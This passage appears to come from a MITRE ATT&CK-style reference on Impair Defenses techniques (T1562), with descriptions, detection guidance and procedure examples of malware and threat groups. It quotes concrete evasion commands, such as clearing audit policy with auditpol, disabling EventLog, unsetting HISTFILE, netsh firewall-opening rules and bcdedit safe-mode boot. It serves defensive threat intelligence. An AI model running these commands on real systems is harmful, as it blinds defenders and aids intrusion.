HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot. In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor. Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems. Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.
+
+Detection:
+
+Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity. Lack of expected log events may be suspicious.
+
+Procedures:
+
+- [S0253] RunningRAT: RunningRAT kills antimalware running process.
+- [S0559] SUNBURST: SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.
+- [G1032] INC Ransom: INC Ransom can use SystemSettingsAdminFlows.exe, a native Windows utility, to disable Windows Defender.
+- [S0659] Diavol: Diavol can attempt to stop security software.
+- [G1018] TA2541: TA2541 has attempted to disable built-in security protections such as Windows AMSI.
+- [S0132] H1N1: H1N1 kills and disables services for Windows Security Center, and Windows Defender.
+- [G0010] Turla: Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.
+- [S0446] Ryuk: Ryuk has stopped services related to anti-virus.
+- [S0457] Netwalker: Netwalker can detect and terminate active security software-related processes on infected systems.
+- [C0035] KV Botnet Activity: KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices.
+- [S0692] SILENTTRINITY: SILENTTRINITY's `amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.
+- [S0496] REvil: REvil can connect to and disable the Symantec server on the victim's network.
+- [S0154] Cobalt Strike: Cobalt Strike has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.
+- [S0223] POWERSTATS: POWERSTATS can disable Microsoft Office Protected View by changing Registry keys.
+- [S0372] LockerGoga: LockerGoga installation has been immediately preceded by a "task kill" command in order to disable anti-virus.
+- [S0144] ChChes: ChChes can alter the victim's proxy configuration.
+- [S1207] XLoader: XLoader loads a copy of NTDLL to evade hooks from security monitoring tools on this library. XLoader can add the path of its executable to the Microsoft Defender exclusion list.
+- [G1047] Velvet Ant: Velvet Ant attempted to disable local security tools and endpoint detection and response (EDR) software during operations.
+- [G1030] Agrius: Agrius used several mechanisms to try to disable security tools. Agrius attempted to modify EDR-related services to disable auto-start on system reboot. Agrius used a publicly available driver, GMER64.sys typically used for anti-rootkit functionality, to selectively stop and remove security software processes.
+- [S0640] Avaddon: Avaddon looks for and attempts to stop anti-malware solutions.
+- [S0377] Ebury: Ebury can disable SELinux Role-Based Access Control and deactivate PAM modules.
+- [S0689] WhisperGate: WhisperGate can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\ drive.
+- [G0069] MuddyWater: MuddyWater can disable the system's local proxy settings.
+- [S0611] Clop: Clop can uninstall or disable security products.
+- [S0228] NanHaiShu: NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity.
+- [S0484] Carberp: Carberp has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.
+- [S1213] Lumma Stealer: Lumma Stealer has attempted to bypass Windows Antimalware Scan Interface (AMSI) by removing the string “AmsiScanBuffer” from the “clr.dll” module in memory to prevent it from being called.
+- [S1114] ZIPLINE: ZIPLINE can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the `--exclude` parameter is passed by the `tar` process.
+- [S0670] WarzoneRAT: WarzoneRAT can disarm Windows Defender during the UAC process to evade detection.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.
+- [S0201] JPIN: JPIN can lower security settings by changing Registry keys.
+- [G0119] Indrik Spider: Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring. Indrik Spider has used `MpCmdRun` to revert the definitions in Microsoft Defender. Additionally, Indrik Spider has used WMI to stop or uninstall and reset anti-virus products and other defensive services.
+- [S0576] MegaCortex: MegaCortex was used to kill endpoint security processes.
+- [S0534] Bazar: Bazar has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.
+- [S0583] Pysa: Pysa has the capability to stop antivirus services and disable Windows Defender.
+- [S1135] MultiLayer Wiper: MultiLayer Wiper removes the Volume Shadow Copy (VSS) service from infected devices along with all present shadow copies.
+- [S0491] StrongPity: StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection.
+- [G1040] Play: Play has used tools including GMER, IOBit, and PowerTool to disable antivirus software.
+- [S1111] DarkGate: DarkGate will terminate processes associated with several security software products if identified during execution.
+- [G0139] TeamTNT: TeamTNT has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.
+- [G0037] FIN6: FIN6 has deployed a utility script named kill.bat to disable anti-virus.
+- [S0061] HDoor: HDoor kills anti-virus found on the victim.
+- [G0092] TA505: TA505 has used malware to disable Windows Defender.
+- [G0047] Gamaredon Group: Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings.
+- [S0601] Hildegard: Hildegard has modified DNS resolvers to evade DNS monitoring tools.
+- [S0531] Grandoreiro: Grandoreiro can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.
+- [S1130] Raspberry Robin: Raspberry Robin can add an exception to Microsoft Defender that excludes the entire main drive from anti-malware scanning to evade detection.
+- [G1024] Akira: Akira has disabled or modified security tools for defense evasion.
+- [S0669] KOCTOPUS: KOCTOPUS will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.
+- [S0688] Meteor: Meteor can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.
+- [S0477] Goopy: Goopy has the ability to disable Microsoft Outlook's security policies to disable macro warnings.
+- [S0595] ThiefQuest: ThiefQuest uses the function kill_unwanted to obtain a list of running processes and kills each process matching a list of security related processes.
+- [S0266] TrickBot: TrickBot can disable Windows Defender.
+- [S1178] ShrinkLocker: ShrinkLocker disables protectors used to secure the BitLocker encryption key on victim systems.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes.
+- [S0400] RobbinHood: RobbinHood will search for Windows services that are associated with antivirus software on the system and kill the process.
+- [G0078] Gorgon Group: Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.
+- [G0024] Putter Panda: Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).
+- [G0059] Magic Hound: Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads.
+- [G0143] Aquatic Panda: Aquatic Panda has attempted to stop endpoint detection and response (EDR) tools on compromised systems.
+- [S0638] Babuk: Babuk can stop anti-virus services on a compromised host.
+- [S0455] Metamorfo: Metamorfo has a function to kill processes associated with defenses and can prevent certain processes from launching.
+- [S1202] LockBit 3.0: LockBit 3.0 can disable security tools to evade detection including Windows Defender.
+- [C0038] HomeLand Justice: During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus.
+- [S0249] Gold Dragon: Gold Dragon terminates anti-malware processes if they’re found running on the system.
+- [S0605] EKANS: EKANS stops processes related to security and management software.
+- [G0032] Lazarus Group: Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services..
+- [S0554] Egregor: Egregor has disabled Windows Defender to evade protections.
+- [S1199] LockBit 2.0: LockBit 2.0 can disable firewall rules and anti-malware and monitoring software including Windows Defender.
+- [C0046] ArcaneDoor: ArcaneDoor modified the Authentication, Authorization, and Accounting (AAA) function of targeted Cisco ASA appliances to allow the threat actor to bypass normal AAA operations.
+- [G1043] BlackByte: BlackByte disabled security tools such as Windows Defender and the Raccine anti-ransomware tool during operations.
+- [G1003] Ember Bear: Ember Bear uses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines. Ember Bear disables Windows Defender via registry key changes.
+- [S0058] SslMM: SslMM identifies and kills anti-malware processes.
+- [S0331] Agent Tesla: Agent Tesla has the capability to kill any running analysis processes and AV software.
+- [S1169] Mango: Mango contains an unused capability to block endpoint security solutions from loading user-mode code hooks via a DLL in a specified process by using the `UpdateProcThreadAttribute API` to set the `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` to `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` for an identified process.
+- [S0004] TinyZBot: TinyZBot can disable Avira anti-virus.
+- [S0334] DarkComet: DarkComet can disable Security Center functions like anti-virus.
+- [S0412] ZxShell: ZxShell can kill AV products' processes.
+- [S0336] NanoCore: NanoCore can modify the victim's anti-virus.
+- [G0094] Kimsuky: Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.
+- [S0608] Conficker: Conficker terminates various services related to system security and Windows.
+- [G0106] Rocke: Rocke used scripts which detected and uninstalled antivirus software.
+- [S0481] Ragnar Locker: Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products.
+- [G0082] APT38: APT38 has unhooked DLLs to disable endpoint detection and response (EDR) or anti-virus (AV) tools.
+- [S0695] Donut: Donut can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related Native API functions to avoid process termination.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware adds .JS and .EXE extensions to the Microsoft Defender exclusion list. BlackByte Ransomware terminates and removes the Raccine anti-ransomware utility.
+- [G1031] Saint Bear: Saint Bear will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality.
+- [G0102] Wizard Spider: Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.
+- [S0449] Maze: Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.
+- [C0029] Cutting Edge: During Cutting Edge, threat actors disabled logging and modified the `compcheckresult.cgi` component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.
+- [S1048] macOS.OSAMiner: macOS.OSAMiner has searched for the Activity Monitor process in the System Events process list and kills the process if running. macOS.OSAMiner also searches the operating system's `install.log` for apps matching its hardcoded list, killing all matching process names.
+- [S0279] Proton: Proton kills security tools like Wireshark that are running.
+- [S0468] Skidmap: Skidmap has the ability to set SELinux to permissive mode.
+- [C0028] 2015 Ukraine Electric Power Attack: During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security.
+- [S0252] Brave Prince: Brave Prince terminates antimalware processes.
+- [S0650] QakBot: QakBot has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.
+- [C0002] Night Dragon: During Night Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.
+- [S0130] Unknown Logger: Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.
+- [S0482] Bundlore: Bundlore can change browser security settings to enable extensions to be installed. Bundlore uses the pkill cfprefsd command to prevent users from inspecting processes.
+- [S0434] Imminent Monitor: Imminent Monitor has a feature to disable Windows Task Manager.
+
+### T1562.002 - Impair Defenses: Disable Windows Event Logging
+
+Description:
+
+Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections. The EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to Security Settings\Local Policies\Audit Policy for basic audit policy settings or Security Settings\Advanced Audit Policy Configuration for advanced audit policy settings. auditpol.exe may also be used to set audit policies. Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the Set-Service -Name EventLog -Status Stopped or sc config eventlog start=disabled commands (followed by manually stopping the service using Stop-Service -Name EventLog). Additionally, the service may be disabled by modifying the “Start” value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog then restarting the system for the change to take effect. There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the "Start" value in the key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System and HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application to disable the entire EventLog. Additionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters. For example, auditpol /set /category:”Account Logon” /success:disable /failure:disable turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: auditpol /clear /y or auditpol /remove /allusers. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.
+
+Detection:
+
+Monitor processes and command-line arguments for commands that can be used to disable logging. For example, Wevtutil, `auditpol`, `sc stop EventLog`, and offensive tooling (such as Mimikatz and `Invoke-Phant0m`) may be used to clear logs. In Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared. `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service. Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered. Monitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`, which may disable Event Viewer.
+
+Procedures:
+
+- [S0645] Wevtutil: Wevtutil can be used to disable specific event logs on the system.
+- [G0027] Threat Group-3390: Threat Group-3390 has used appcmd.exe to disable logging on a victim server.
+- [G0059] Magic Hound: Magic Hound has executed scripts to disable the event log service.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29, used `AUDITPOL` to prevent the collection of audit logs.
+- [C0038] HomeLand Justice: During HomeLand Justice, threat actors deleted Windows events and application logs.
+- [C0025] 2016 Ukraine Electric Power Attack: During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems.
+
+### T1562.003 - Impair Defenses: Impair Command History Logging
+
+Description:
+
+Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems. Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to "ignorespace". HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing. Adversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. no logging).
+
+Detection:
+
+Correlating a user session with a distinct lack of new commands in their .bash_history can be a clue to suspicious behavior. Additionally, users checking or changing their HISTCONTROL, HISTFILE, or HISTFILESIZE environment variables may be suspicious. Monitor for modification of PowerShell command history settings through processes being created with -HistorySaveStyle SaveNothing command-line arguments and use of the PowerShell commands Set-PSReadlineOption -HistorySaveStyle SaveNothing and Set-PSReadLineOption -HistorySavePath {File Path}. Further, Network Device CLI commands may also be used to clear or disable historical log data with built-in features native to the network device platform. Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.
+
+Procedures:
+
+- [S1186] Line Dancer: Line Dancer can disable syslog on compromised devices.
+- [G1041] Sea Turtle: Sea Turtle unset the Bash and MySQL history files on victim systems.
+- [S1161] BPFDoor: BPFDoor sets the `MYSQL_HISTFILE` and `HISTFILE` to `/dev/null` preventing the shell and MySQL from logging history in `/proc//environ`.
+- [C0046] ArcaneDoor: ArcaneDoor included disabling logging on targeted Cisco ASA appliances.
+- [G0082] APT38: APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.
+- [S0692] SILENTTRINITY: SILENTTRINITY can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.
+
+### T1562.004 - Impair Defenses: Disable or Modify System Firewall
+
+Description:
+
+Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel. Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port). Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules. In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.
+
+Detection:
+
+Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.
+
+Procedures:
+
+- [S0260] InvisiMole: InvisiMole has a command to disable routing and the Firewall on the victim’s machine.
+- [S1211] Hannotog: Hannotog can modify local firewall settings via `netsh` commands to open a listening UDP port.
+- [G0008] Carbanak: Carbanak may use netsh to add local firewall rule exceptions.
+- [G1045] Salt Typhoon: Salt Typhoon has made changes to the Access Control List (ACL) and loopback interface address on compromised devices.
+- [S0336] NanoCore: NanoCore can modify the victim's firewall.
+- [S0245] BADCALL: BADCALL disables the Windows firewall before binding to a port.
+- [G0106] Rocke: Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.
+- [G0139] TeamTNT: TeamTNT has disabled iptables.
+- [S1181] BlackByte 2.0 Ransomware: BlackByte 2.0 Ransomware modifies the Windows firewall during execution.
+- [S1178] ShrinkLocker: ShrinkLocker turns on the system firewall and deletes all of its rules during execution.
+- [S0132] H1N1: H1N1 kills and disables services for Windows Firewall.
+- [S0263] TYPEFRAME: TYPEFRAME can open the Windows Firewall on the victim’s machine to allow incoming connections.
+- [G0035] Dragonfly: Dragonfly has disabled host-based firewalls. The group has also globally opened port 3389.
+- [C0051] APT28 Nearest Neighbor Campaign: During APT28 Nearest Neighbor Campaign, APT28 added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.
+- [S0108] netsh: netsh can be used to disable local firewall settings.
+- [S1032] PyDCrypt: PyDCrypt has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using `netsh.exe` on remote machines.
+- [S0687] Cyclops Blink: Cyclops Blink can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.
+- [G1009] Moses Staff: Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines.
+- [S0385] njRAT: njRAT has modified the Windows firewall to allow itself to communicate through the firewall.
+- [S0531] Grandoreiro: Grandoreiro can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.
+- [S0125] Remsec: Remsec can add or remove applications or ports on the Windows firewall or disable it entirely.
+- [S0013] PlugX: PlugX has modified local firewall rules on victim machines to enable a random, high-number listening port for subsequent access and C2 activity.
+- [G1022] ToddyCat: Prior to executing a backdoor ToddyCat has run `cmd /c start /b netsh advfirewall firewall add rule name="SGAccessInboundRule" dir=in protocol=udp action=allow localport=49683` to allow the targeted system to receive UDP packets on port 49683.
+- [S0412] ZxShell: ZxShell can disable the firewall by modifying the registry key HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile.
+- [S1161] BPFDoor: BPFDoor starts a shell on a high TCP port starting at 42391 up to 43391, then changes the local `iptables` rules to redirect all packets from the attacker to the shell port.
+- [G0049] OilRig: OilRig has modified Windows firewall rules to enable remote access.
+- [S0334] DarkComet: DarkComet can disable Security Center functions like the Windows Firewall.
+- [S0492] CookieMiner: CookieMiner has checked for the presence of "Little Snitch", macOS network monitoring and application firewall software, stopping and exiting if it is found.
+- [G0059] Magic Hound: Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - `"netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389`.
+- [C0014] Operation Wocao: During Operation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall.
+- [G0032] Lazarus Group: Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh.
+- [G0082] APT38: APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.
+- [G0094] Kimsuky: Kimsuky has been observed disabling the system firewall.
+- [C0049] Leviathan Australian Intrusions: Leviathan modified system firewalls to add two open listening ports on 9998 and 9999 during Leviathan Australian Intrusions.
+- [S0376] HOPLIGHT: HOPLIGHT has modified the firewall using netsh.
+- [G1047] Velvet Ant: Velvet Ant modified system firewall settings during PlugX installation using `netsh.exe` to open a listening, random high number port on victim devices.
+- [S0246] HARDRAIN: HARDRAIN opens the Windows Firewall to modify incoming connections.
+- [S0031] BACKSPACE: The "ZR" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.
+- [S0088] Kasidet: Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded.
+- [G1043] BlackByte: BlackByte modified firewall rules on victim machines to enable remote system discovery.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used `netsh` to configure firewall rules that limited certain UDP outbound packets.
+
+### T1562.006 - Impair Defenses: Indicator Blocking
+
+Description:
+
+An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation. For example, adversaries may modify the `File` value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.
+
+Detection:
+
+Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data. Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}
+
+Procedures:
+
+- [S0697] HermeticWiper: HermeticWiper has the ability to set the `HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled` Registry key to `0` in order to disable crash dumps.
+- [G0096] APT41: APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.
+- [S1065] Woody RAT: Woody RAT has suppressed all error reporting by calling `SetErrorMode` with 0x8007 as a parameter.
+- [G1023] APT5: APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.
+- [S1097] HUI Loader: HUI Loader has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).
+- [S0377] Ebury: Ebury hooks system functions to prevent the user from seeing malicious files (`readdir`, `realpath`, `readlink`, `stat`, `open`, and variants), hide process activity (`ps` and `readdir64`), and socket activity (`open` and `fopen`).
+- [S1184] BOLDMOVE: BOLDMOVE can disable the Fortinet daemons `moglogd` and `syslogd` to evade detection and logging.
+- [S1200] StealBit: StealBit can configure processes to not display certain Windows error messages by through use of the `NtSetInformationProcess`.
+- [S0579] Waterbear: Waterbear can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection.
+
+### T1562.007 - Impair Defenses: Disable or Modify Cloud Firewall
+
+Description:
+
+Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining). Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for Brute Force or Endpoint Denial of Service.
+
+Detection:
+
+Monitor cloud logs for modification or creation of new security groups or firewall rules.
+
+Procedures:
+
+- [S1091] Pacu: Pacu can allowlist IP addresses in AWS GuardDuty.
+
+### T1562.008 - Impair Defenses: Disable or Modify Cloud Logs
+
+Description:
+
+An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.
+
+Detection:
+
+Monitor logs for API calls to disable logging. In AWS, monitor for: StopLogging and DeleteTrail. In GCP, monitor for: google.logging.v2.ConfigServiceV2.UpdateSink. In Azure, monitor for az monitor diagnostic-settings delete. Additionally, a sudden loss of a log source may indicate that it has been disabled.
+
+Procedures:
+
+- [S1091] Pacu: Pacu can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.
+- [G0016] APT29: APT29 has disabled Purview Audit on targeted accounts prior to stealing emails from Microsoft 365 tenants.
+
+### T1562.009 - Impair Defenses: Safe Mode Boot
+
+Description:
+
+Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot. Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings. Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.
+
+Detection:
+
+Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a \* in front of the "Startup" value name: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\["\*Startup"="{Path}"] or by adding a key to HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal. Monitor execution of processes and commands associated with making configuration changes to boot settings, such as bcdedit.exe and bootcfg.exe.
+
+Procedures:
+
+- [S0496] REvil: REvil can force a reboot in safe mode with networking.
+- [S1212] RansomHub: RansomHub can reboot targeted systems into Safe Mode prior to encryption.
+- [S1070] Black Basta: Black Basta can reboot victim machines in safe mode with networking via `bcdedit /set safeboot network`.
+- [S1202] LockBit 3.0: LockBit 3.0 can reboot the infected host into Safe Mode.
